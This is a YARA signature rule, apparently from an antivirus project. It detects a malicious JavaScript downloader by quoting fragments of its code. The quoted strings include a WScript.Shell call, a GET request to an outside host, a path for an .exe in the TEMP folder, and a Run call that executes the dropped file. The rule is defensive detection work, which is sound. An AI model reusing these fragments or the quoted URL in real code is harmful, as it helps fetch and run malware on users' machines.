rule sig_20160330_b7971aa28a9386772c15fa1ef1dbc63f {
  meta:
    description = "datamaliciousorder - file 20160330_b7971aa28a9386772c15fa1ef1dbc63f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "411fa1d04268d315dcd09dfe0376eda2021b2ec2588380b7f6beb9fc3cff5ac4"

  strings:
    $s1  = "function S(OR, RD){W = W * 1; return OR - RD;};" fullword ascii
    $s2  = "var B1 = function N() {return WScript[FZ](\"WScript\"+\".Shell\");}(), OU = 11;" fullword ascii
    $s3  = "C[B](\"GET\", \"http://vidamparty.hu/as0ldr\", false);" fullword ascii
    $s4  = "if (C[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZI(){return LB + \"\";};" fullword ascii
    $s6  = "function Y() {return B1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jQygpSxzYBM.ex\" + \"e\";};" fullword ascii
    $s7  = "function F(N0){B1[\"Run\"](N0, W, W);};" fullword ascii
    $s8  = "function I() {return ((HD == true) && (HD == R)) ? 1 : W;};" fullword ascii
    $s9  = "function HO(){return 22;};" fullword ascii
    $s10 = "var GV = new this[\"Date\"]();" fullword ascii
    $s11 = "return S(ET, LK);" fullword ascii
    $s12 = "function K(B0) {var A = (1, 2, 3, 4, 5, B0); return A;};" fullword ascii
    $s13 = "function M(){return FZ;};" fullword ascii
    $s14 = "}while (IW);" fullword ascii
    $s15 = "function JD()" fullword ascii
    $s16 = "var MZ = false;" fullword ascii
    $s17 = "var HD = false;" fullword ascii
    $s18 = "HD = true; " fullword ascii
    $s19 = "} catch(QX){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}